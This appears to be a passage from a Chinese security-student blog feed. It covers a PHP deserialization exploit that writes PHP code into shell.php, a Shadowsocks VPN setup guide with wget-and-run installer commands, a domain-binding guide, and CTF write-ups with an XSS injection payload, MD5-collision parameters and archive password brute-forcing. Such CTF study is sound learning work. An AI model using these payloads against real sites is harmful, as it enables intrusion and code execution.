<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">var</span> $value = <span class="string">'123'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> test;</span></span><br><span class="line"><span class="php">$obj-&gt;value = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span></span><br><span class="line"><span class="php">$temp = serialize($obj);</span></span><br><span class="line"><span class="php">print_r($temp);</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>运行后得到<br><code>O:4:&quot;test&quot;:1:{s:5:&quot;value&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}</code></p>
<p>将其传入漏洞站点<br><img src="https://hnxpvw.sn.files.1drv.com/y4mlAB2rR0Ly2OWnhfqw81vPjM3_N7Rplaz4pdwN3P-ZOjhYUqzyHEb7LYHa_WpEY6MugjTJlF5Sc6eKN8XOWEhoCgSu5aqweIoM7cYcOs-lNG1w3jtWSiQq9-cJ8-R4iIg2g0VD2UdiuiZUCsT1wUyuzW_-ksPd3VoEuHVD1SrGuPpbCI1LVDZlWhk1Ttv_bAIzTezKHze1mjYMu-GdcY1dA?width=935&height=124&cropmode=none" alt></p>
<p>打开shell.php发现成功写入<code>&lt;?php phpinfo(); ?&gt;</code> 并解析成功<br><img src="https://k9xnvw.sn.files.1drv.com/y4mA1SrTXYGLV_p2xj1l9ppGgrmV04wk5CzFXZKKS0bCBRpZ3bqOgx0MLzAh9CFDLE5iBpFNimEAYrmivr5CsAJ0BNPjc-7y9D2J40kZgEAlMm2PfkMlecvpqu4wrEkC9GrKDhIrZSUnSmdwvsMZ0Ni-zHR7xdZq1ybodjt2X5BSAqLXKITsplUTtC9mmDY8g36hJ6mH0eed88y35_G578GJg?width=935&height=687&cropmode=none" alt></p>
<hr>
]]></content>
      <tags>
        <tag>序列化</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>使用shadowsocks(R)搭建vpn服务</title>
    <url>/2018/10/31/%E4%BD%BF%E7%94%A8shadowsocks(R)-%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<!--https://github.com/Alvin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B 有缘链接送有缘人-->

<h2 id="租云服务器-境外"><a href="#租云服务器-境外" class="headerlink" title="租云服务器(境外)"></a>租云服务器(境外)</h2><ul>
<li>充值-&gt;选服务器-&gt;确定-&gt;完成</li>
</ul>
<blockquote>
<p>这里我租的是 Vultr 的服务器<br>配置: Ubuntu1804 日本机房 仅仅搭个 VPN ， cpu 、内存、硬盘套餐选个便宜的就行(注意不要$2.5的 不要$2.5的 不要$2.5的，没有ipv4地址，另租ipv4不划算！)</p>
</blockquote>
<h2 id="搭建服务端"><a href="#搭建服务端" class="headerlink" title="搭建服务端"></a>搭建服务端</h2><ul>
<li><p>ssh连接服务器</p>
<p>(ss)</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget --<span class="keyword">no</span>-check-certificate -O shadowsocks-<span class="keyword">all</span>.<span class="keyword">sh</span> http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/teddysun/shadowsocks_install/master/shadowsocks-<span class="keyword">all</span>.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> shadowsocks-<span class="keyword">all</span>.<span class="keyword">sh</span></span><br><span class="line">./shadowsocks-<span class="keyword">all</span>.<span class="keyword">sh</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocks-<span class="keyword">all</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>或(ssr)</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/teddysun/shadowsocks_install/master/shadowsocksR.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> shadowsocksR.<span class="keyword">sh</span></span><br><span class="line">./shadowsocksR.<span class="keyword">sh</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee shadowsocksR.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<p>  几个版本哪个都行</p>
<ul>
<li>最后一步会让设置端口，密码，加密方式等，按步骤来就行 记住你设置的参数，连接会用到</li>
</ul>
<p>设置完成，VPN 服务端就搭好了</p>
<h2 id="配置客户端"><a href="#配置客户端" class="headerlink" title="配置客户端"></a>配置客户端</h2><ul>
<li>下载 shadowsocks 的客户端，<a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">Windows 客户端</a></li>
<li>下载完打开 ss 开始配置，地址、端口、密码必填，选择你的加密方式，如果开启允许其他设备连接那就把代理端口设置一下</li>
</ul>
<p><img src="https://hnxlvw.sn.files.1drv.com/y4m6xHc5GVNJ6uSDNapZabiV4hw2TxoZfdL7Or8ga6O9wM-4RZ0Wxvl3Z-rLasmUAmg64inxg5iRMShc8BrjjcKKhUaJG3ZslTYIFpzz_DHgqPL3t-rkNLc_b5Up8CE6X9ukg8Sh9sDX4UBelpxc9ICsxYRXsMOOzkHavervj7I6jfgyIoMf7jgqTgD29h3yTauYa3QU4X7IaSlgodFiAU5RQ?width=267&height=398&cropmode=none" alt></p>
<p>配置完成，右键任务栏的小飞机图标，选择启动系统代理，就能从设备上翻墙了</p>
<ul>
<li>ssr客户端，<a href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases" target="_blank" rel="noopener">ssr</a></li>
</ul>
<h2 id="使用-GOOGLE-BBR-加速-可选"><a href="#使用-GOOGLE-BBR-加速-可选" class="headerlink" title="使用 GOOGLE BBR 加速(可选)"></a>使用 GOOGLE BBR 加速(可选)</h2><ol>
<li><p>修改系统变量并保存生效</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"net.core.default_qdisc=fq"</span> &gt;&gt; <span class="string">/etc/sysctl.conf</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; <span class="string">/etc/sysctl.conf</span></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看内核是否开启 BBR</p>
<p>如下显示即为开启</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sysctl net.ipv4.tcp_available_congestion_control</span></span><br><span class="line"><span class="attr">net.ipv4.tcp_available_congestion_control</span> = bbr cubic re<span class="literal">no</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看BBR是否启动</p>
<p>如下显示即为启动</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># lsmod | grep bbr</span></span><br><span class="line"><span class="string">tcp_bbr</span>                <span class="number">20480</span>  <span class="number">8</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><p>安装BBR</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget --<span class="keyword">no</span>-check-certificate http<span class="variable">s:</span>//github.<span class="keyword">com</span>/teddysun/across/raw/master/bbr.<span class="keyword">sh</span></span><br><span class="line">chmod +<span class="keyword">x</span> bbr.<span class="keyword">sh</span></span><br><span class="line">./bbr.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>重启服务器</p>
<p><code>lsmod | grep bbr</code>查看bbr状态</p>
<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># ./shadowsocks-all.sh uninstall</span></span><br></pre></td></tr></table></figure>

<h2 id="服务器无法连接"><a href="#服务器无法连接" class="headerlink" title="服务器无法连接"></a>服务器无法连接</h2><blockquote>
<p>Vultr 换服务器就更换 IP ，所以 IP 是循环使用的<br>可能你的服务器就刚好换到被中国墙了的 IP 或者一段时间的使用后你的 IP 被墙了<br>这都很正常，解决方法:<br>把你的服务器删了，重新选择一次就换 IP 了<br>要是还是被墙，那么推荐你去这里逛逛:<a href="http://www.cwl.gov.cn/" target="_blank" rel="noopener">|`传送门``|</a></p>
</blockquote>
]]></content>
      <categories>
        <category>VPN</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>shadowsockR</tag>
        <tag>ss</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Github和Coding布置博客的域名问题</title>
    <url>/2018/10/30/%E5%85%B3%E4%BA%8EGithub%E5%92%8CCoding%E5%B8%83%E7%BD%AE%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9F%9F%E5%90%8D%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<ul>
<li>先讲清本人blog环境:<blockquote>
<p>使用 Github 和 Coding 两个平台，即 abelche.github.io 和 abelche.coding.me<br>阿里云租的两个域名 abelche.com 和 abelche.top</p>
</blockquote>
</li>
</ul>
<hr>
<h1 id="通过自己的域名访问"><a href="#通过自己的域名访问" class="headerlink" title="通过自己的域名访问"></a>通过自己的域名访问</h1><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><ul>
<li>在平台中绑定自己的域名</li>
<li>在域名解析中添加记录 CNAME 类型，从你的域名(主机记录)指向平台域名(记录值)即可</li>
</ul>
<h3 id="统一-url"><a href="#统一-url" class="headerlink" title="统一 url"></a>统一 url</h3><h4 id="Coding-平台布置"><a href="#Coding-平台布置" class="headerlink" title="Coding 平台布置"></a>Coding 平台布置</h4><p>Coding 的布置比较容易</p>
<ul>
<li>这是 Coding 的配置界面</li>
<li>我这里绑定了两个，有无 www 的，我只想让 url 出现 <a href="http://www.abelche.top" target="_blank" rel="noopener">www.abelche.top</a> 只需要把跳转选上就行</li>
<li>安全证书有就选上吧</li>
</ul>
<p><img src="https://k9xrvw.sn.files.1drv.com/y4mzh76_mf6Yhzs8QliBHa9zxA-aYlJ8Pp_UAoKwOS5TDg1ZXF9OFvWqhew2XgKLErZgkc9jYQ68uvRcC1BUKBTqjPcF9D2XriiPtj3PvKZIwh1sKbQoN0s8qvbEQkKzQprwIHz38JkGnrMFIzau_pcZ43RVumpylytBCIfdONzNgrMsNgpyNkZ2Flryk2Arp10lvndpuVb1Vpq1P0QTBSzLQ?width=1874&height=875&cropmode=none" alt></p>
<h4 id="Github-平台布置"><a href="#Github-平台布置" class="headerlink" title="Github 平台布置"></a>Github 平台布置</h4><p>Github 只能绑定一个域名，所以需要我们在 DNS 解析上做点文章</p>
<ul>
<li>和 Coding 绑定一样，在 Github 上绑定好域名，这里只能绑定一个域名，我想让访问 url 都为 www 我这里添加的是 <a href="http://www.abelche.com" target="_blank" rel="noopener">www.abelche.com</a></li>
</ul>
<p><img src="https://k9xqvw.sn.files.1drv.com/y4mMV9Ipg9E_6VbgCJy4TNPO9HxugOZVShBcczSgUVZkjb8ftTrYRj9gJiJYtC0IEBr4Rfa78KMBaxET6W5R89QfZMBUCPmrNfH2YfEuo1TNZ9VQWw9BpYt0njyMO2ddzUIuoQPTWY_UR9dn80IaOHdhGDgYvixIrQo5745XiAx8ReSl334xydAfDIydOPEfWTzzxCfb5AtaJTdlyz8lP8uiw?width=759&height=639&cropmode=none" alt><br><img src="https://k9xtvw.sn.files.1drv.com/y4mVP1rTEKGXIw6y1_LF-jugU6i_SWEfqoDmstX9ZKaRMeGS6tKJr7YA6axbY_JFPrwLeo_mtmR1tetjMUBzG7D0gZoIDynDOy_xjMNbtOWxAqgdeq_ahYIceB9WXCpvWL-d_Gc-cBchDEAfkRjgDoBldgl95d0QBxWFGJDPcovlmKD2qqIxhfzLgmQhZBrpuha3dykJ3a6lTC82WT_W7tC4g?width=716&height=314&cropmode=none" alt></p>
<ul>
<li>在阿里云域名管理的 DNS 解析额外添加一条记录</li>
</ul>
<p><img src="https://k9xsvw.sn.files.1drv.com/y4mpwpieszUlJBKFIr-ANN-vlUnMTOKz-mtTsCK3PuReGtvs7oP35E6xOovX-57pxyrWjaXjA4hXtR6qeW31M63W4PZzPgFHAvpMGOo8X2vDesPJUOFLJXWJQMU35vuyC09bqajG_7LijQ_zA9Io4wUc6rNUp3lxBwIh2Wt2IGtTs6UWok-TZBifsF7MJv0ni2XHmTwvb16ywmh49Tfc59cxg?width=487&height=241&cropmode=none" alt></p>
<hr>
]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>域名</tag>
        <tag>url</tag>
        <tag>域名解析</tag>
        <tag>Github</tag>
        <tag>Coding</tag>
        <tag>博客</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-DLCTF2018</title>
    <url>/2018/09/20/Writeup/WP-DLCTF2018/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="网络安全法"><a href="#网络安全法" class="headerlink" title="网络安全法"></a>网络安全法</h2><p>百度一下，你就知道</p>
<hr>
<h2 id="漏洞-Top-10"><a href="#漏洞-Top-10" class="headerlink" title="漏洞 Top_10"></a>漏洞 Top_10</h2><p>进入题目后先正常查询，发现查到7(XSS)的时候有红色字母提示，解读后发现是 alert(key) ，那么就更明确这道题是 XSS 漏洞，只有一个输入框，那么有可能是突破点</p>
<p>bp 抓下包，发现是 post 传输的 id ，在源码中找到传入的 id 值在<code>&lt;script&gt;&lt;/script&gt;</code>中</p>
<p>而且该值是用<code>&#39;&#39;</code>引起来的，那么直接构造<code>&#39;;alert(&#39;key&#39;);&#39;</code> post 传入得到flag</p>
<hr>
<h2 id="I-DONT-LIKE-MD5"><a href="#I-DONT-LIKE-MD5" class="headerlink" title="I_DONT_LIKE_MD5"></a>I_DONT_LIKE_MD5</h2><p>这道题是明显的md5碰撞，那么直接 GET 传参<code>5[]=1&amp;&amp;m[]=QNKCDZO&amp;&amp;d[]=s878926199a</code><br>进入到新网页，按F12得到flag</p>
<hr>
<h2 id="我是来送分的"><a href="#我是来送分的" class="headerlink" title="我是来送分的"></a>我是来送分的</h2><p>根据提示，直接在网站个人信息页面查看源码，查找<code>flag</code></p>
<hr>
<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="听说WEB有送分？"><a href="#听说WEB有送分？" class="headerlink" title="听说WEB有送分？"></a>听说WEB有送分？</h2><p>notepad++打开查找<code>flag</code></p>
<hr>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="basebasebase"><a href="#basebasebase" class="headerlink" title="basebasebase"></a>basebasebase</h2><p>base隐写脚本如下 py27</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">def get_base64_diff_value(s1, s2):</span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in xrange(<span class="built_in">len</span>(s1)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.<span class="built_in">index</span>(s1[i]) - base64chars.<span class="built_in">index</span>(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">res</span></span><br><span class="line"></span><br><span class="line">def solve_stego():</span><br><span class="line"></span><br><span class="line">    with <span class="keyword">open</span>(<span class="string">'./3.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">        file_lines = <span class="keyword">f</span>.readlines()</span><br><span class="line"></span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> in file_line<span class="variable">s:</span></span><br><span class="line">        steg_line = <span class="built_in">line</span>.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">        norm_line = <span class="built_in">line</span>.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">        diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line"></span><br><span class="line">        pads_num = steg_line.<span class="built_in">count</span>(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> diff:</span><br><span class="line">            bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line"></span><br><span class="line">        res_str += chr(<span class="keyword">int</span>(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">print</span> res_str</span><br><span class="line"></span><br><span class="line">solve_stego()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="眼见为实"><a href="#眼见为实" class="headerlink" title="眼见为实"></a>眼见为实</h2><p>打开后发现很长的文本，但是只由0-9，A-F组成，那么有可能是16进制</p>
<p>notepad++打开，工具HEX-&gt;ASCII，保存</p>
<p>记事本打开后发现有一串诡异的字符<code>Z m x h Z 3 t X Z T F j T 2 1 l X 3 Q w X 0 R M T l V D V E Y h I S F 9</code></p>
<p>去掉空格 base64 解码得到flag</p>
<hr>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>一个160+M的包，wireshark打开</p>
<p>这么大，加载都半天的东西肯定要分析一下，</p>
<p>结合提示，既然是黑客登陆 web 服务器，且有 webshell</p>
<p>过滤 http 协议，从后往前找，先发现了<code>/image/article/a.php</code>，一看这就是马，打开后更加确定 webshell 为 a.php</p>
<p>继续往前找，找到 http协议 login 的包，先找到用户名为”人事”的登陆信息，不太像答案，再往前找发现了 admin 的登陆信息<img src="https://i.imgur.com/nYZDFcb.png" alt></p>
<p>提交flag，正确</p>
<hr>
<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="嘀嘀嘀"><a href="#嘀嘀嘀" class="headerlink" title="嘀嘀嘀"></a>嘀嘀嘀</h2><p>先摩斯密码解密，解密后是以0x开头的文本，HEX-&gt;ASCII解码，得到 unicode 编码的字符串，<br><code>&amp;#x0035;&amp;#x0041;&amp;#x0036;&amp;#x0044;&amp;#x0037;&amp;#x0038;&amp;#x0036;&amp;#x0038;&amp;#x0035;&amp;#x0041;&amp;#x0033;&amp;#x0033;&amp;#x0037;&amp;#x0033;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0036;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0039;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0041;&amp;#x0034;&amp;#x0034;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0033;&amp;#x0034;&amp;#x0045;&amp;#x0037;&amp;#x0041;&amp;#x0035;&amp;#x0031;&amp;#x0033;&amp;#x0034;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0035;&amp;#x0033;&amp;#x0030;&amp;#x0034;&amp;#x0045;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0034;&amp;#x0036;&amp;#x0037;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0045;&amp;#x0035;&amp;#x0034;&amp;#x0035;&amp;#x0031;&amp;#x0037;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0037;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0034;&amp;#x0038;&amp;#x0033;&amp;#x0030;&amp;#x0033;&amp;#x0044;</code><br>继续Unicode转中文解码，得到<br><code>5A6D78685A3373314D7A466A597A4A6A5A4449314D324D334E7A51344D3245304E3249324D5467314E5451784D574A684D48303D</code><br>又是16进制，转字符串<br><code>ZmxhZ3s1MzFjYzJjZDI1M2M3NzQ4M2E0N2I2MTg1NTQxMWJhMH0=</code><br>base64<br><code>flag{531cc2cd253c77483a47b61855411ba0}</code></p>
<hr>
<h2 id="鸭！这大脸盘子！！！"><a href="#鸭！这大脸盘子！！！" class="headerlink" title="鸭！这大脸盘子！！！"></a>鸭！这大脸盘子！！！</h2><p>下载一张图片，一看就是猪圈，<code>RWEB</code></p>
<p>下面给的一串字符串</p>
<p>用维吉尼亚密码解密 RWEB 是密钥</p>
<p>得到flagisvigenereandpigpencipher</p>
<p>提交flag{vigenereandpigpencipher}发现不正确，</p>
<p>看到hint有大写字母，尝试flag{VigenereAndPigPenCipher}正确</p>
<hr>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>DLCTF</tag>
        <tag>杂项</tag>
        <tag>密码学</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-Bugku-杂项系列</title>
    <url>/2018/08/26/Writeup/WP-Bugku-%E6%9D%82%E9%A1%B9%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/1.jpg" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/1.jpg</a></p>
<p>将图片保存下来，直接notpad++查看下，发现末尾有一串<img src="https://i.imgur.com/9NdW2yb.png" alt></p>
<p>Unicode解码后的到key{you are right}</p>
<h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><p>题目地址<a href="http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar" target="_blank" rel="noopener">http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar</a></p>
<p>一个压缩包，里面是一张.png的图片<img src="https://i.imgur.com/l4YOcnP.png" alt></p>
<p>用各种工具查看也没什么发现，</p>
<p>后来知道是修改图片的宽高……</p>
<blockquote>
<p>winhex打开后第一行是文件头，固定格式<br>第二行的前四位是宽，后四位是高</p>
</blockquote>
<p>winhex打开<img src="https://i.imgur.com/hF9cNrj.png" alt><br>A4 改为 F4 <img src="https://i.imgur.com/F9kxb7Y.png" alt> </p>
<p>修改成功<img src="https://i.imgur.com/Eao2ZCH.png" alt></p>
<h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/telnet/1.zip" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/telnet/1.zip</a></p>
<p>wireshark打开，查看tcp数据流<img src="https://i.imgur.com/DtuESFV.png" alt><br><img src="https://i.imgur.com/r0xMz6X.png" alt></p>
<p>得到flag{d316759c281bf925d600be698a4973d5}</p>
<h1 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h1><p>题目地址<a href="http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip" target="_blank" rel="noopener">http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip</a></p>
<p>下载得到一个名为 zip 的文件，根据文件名的提示，给它加 .zip 的后缀</p>
<p>果然成功打开，打开后发现<img src="https://i.imgur.com/ftqSTAK.png" alt></p>
<p>解压后发现文件错误，本着试一试的原则，后缀名改成 .zip<br>结果还真能打开，压缩包里是<img src="https://i.imgur.com/yc7K9hi.png" alt><br>查看文件，最终在 <em>眼见非实.zip\眼见非实\word\document.xml</em> 这个文件中找到flag<img src="https://i.imgur.com/yiz4PTU.png" alt></p>
<p>flag{F1@g}</p>
<h1 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/2.jpg" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/2.jpg</a></p>
<p>保存图片，直接扔 binwalk 里<img src="https://i.imgur.com/wnUOqW7.png" alt><br>foremost 分离后直接得到flag的图片<img src="https://i.imgur.com/c7zUD0U.png" alt></p>
<h1 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png</a></p>
<p>题目提示flag是某人名字全拼</p>
<p>图片又是一张不全的照片<br>直接百度识图，搜到原图<img src="https://i.imgur.com/wnxCabR.png" alt></p>
<p>key{liuyifei}</p>
<h1 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h1><p>题目地址<a href="http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin" target="_blank" rel="noopener">http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin</a></p>
<p>上网搜索得知需要用 <a href="http://www.nirsoft.net/toolsdownload/routerpassview.zip" target="_blank" rel="noopener">RouterPassView</a> 这个软件打开<img src="https://i.imgur.com/tGrk6jY.png" alt></p>
<h1 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h1><p>题目地址<a href="http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg" target="_blank" rel="noopener">http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg</a></p>
<p>把这张傻子图扔到binwalk上<img src="https://i.imgur.com/4HfLLeH.png" alt><br>foremost分开，有一个压缩包，里面有一个加密的压缩包和一张图片<img src="https://i.imgur.com/E1VlWV1.png" alt><br>分析提示，三个数，一个国王，一个女神，一个骑士，又说斗地主……那不就….还是直接暴力破解吧</p>
<p>先做个字典000~999,写了个垃圾的py(但是能用啊)</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">filename</span> = <span class="string">"num.txt"</span></span><br><span class="line">for <span class="meta">x</span> <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">    for y <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">        for z <span class="meta">in</span><span class="meta"> range(</span>10):</span><br><span class="line">            with<span class="meta"> open(</span><span class="meta">filename</span>, <span class="string">"a"</span>) <span class="meta">as</span> file_obj:</span><br><span class="line">                file_obj.write(str(<span class="meta">x</span>)+str(y)+str(z)+<span class="string">'\n'</span>)</span><br><span class="line">file_obj<span class="meta">.close(</span>)</span><br></pre></td></tr></table></figure>

<p>暴力破解，试了好多，终于找到一个速度快又好用的工具<a href="http://dl-t1.wmzhe.com/15/15056/Advanced%20Archive%20Password%20Recovery%204.54.exe" target="_blank" rel="noopener">Advanced Archive Password Recovery</a><br>密码871<img src="https://i.imgur.com/TBEoJSQ.png" alt></p>
<p>拿到图片，notpad++打开得到f1@g{eTB1IEFyZSBhIGhAY2tlciE=}</p>
<p>提交发现不正确！还要解密….<br>base64解密 eTB1IEFyZSBhIGhAY2tlciE= 得到y0u Are a h@cker!<br>最后输入flag{y0u Are a h@cker!}</p>
<h1 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/3.zip" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/3.zip</a></p>
<p>下载后打开两次会报错，然后就好了，不知道是题目的原因还是真出错了….</p>
<p>得到一个<img src="https://i.imgur.com/jxex9qD.png" alt><br>打不开，后缀改成 .txt 打开是提示图片格式和一长串 base64<br>那就base64转图片解密<br>得到一张二维码<img src="https://i.imgur.com/Xsi5dud.png" alt></p>
<p>识别后得到KEY{dca57f966e4e4e31fd5b15417da63269}</p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>题目地址<a href="http://120.24.86.145:8002/misc/1.tar.gz" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/1.tar.gz</a></p>
<p>不知道这道题怎么出的，解压，直接notepad++查看文件搜索 key 就得到key{feb81d3834e2423c9903f4755464060b}</p>
<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>题目地址<a href="http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip" target="_blank" rel="noopener">http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip</a></p>
<p>多点几次打开压缩包解压</p>
<p>wireshark打开caidao.pcapng<br>查看tcp流发现有压缩包文件</p>
<p>扔到kali中<code>binwalk 文件 -e</code>得到一个文件，添加后缀.tar，打开<img src="https://i.imgur.com/RmtHpxb.png" alt><br>得到key{8769fe393f2b998fa6a11afe2bfcd65e}</p>
